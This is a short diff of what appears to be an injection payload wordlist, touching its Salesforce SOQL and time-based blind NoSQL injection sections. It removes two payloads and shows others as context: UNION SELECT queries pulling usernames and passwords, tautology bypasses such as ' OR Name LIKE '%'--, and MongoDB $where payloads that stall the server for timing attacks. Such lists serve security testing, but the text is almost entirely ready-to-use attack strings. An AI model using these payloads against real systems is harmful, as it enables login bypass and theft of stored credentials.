@@ -242,7 +242,6 @@ admin'--
 /users.json?orderBy="uid"
 
 # ── SOQL (Salesforce) ──
-' OR '1'='1
 ' LIMIT 200 OFFSET 0--
 admin' OR Account.Name != '
 ' OR Name LIKE '%'--
@@ -258,7 +257,6 @@ test' UNION SELECT id, username, password FROM User--
 {"$expr": {"$gt": ["$loginCount", 0]}}
 
 # ── TIME-BASED BLIND NOSQLI ──
-{"$where": "sleep(3000)"}
 {"$where": "function(){var d = new Date(); var c = new Date(); while(c-d<3000){c=new Date();}; return true;}"}
 {"$where": "var x = db.runCommand({'sleep': 3000}); return true;"}
 {"username": {"$where": "sleep(5000)"}}
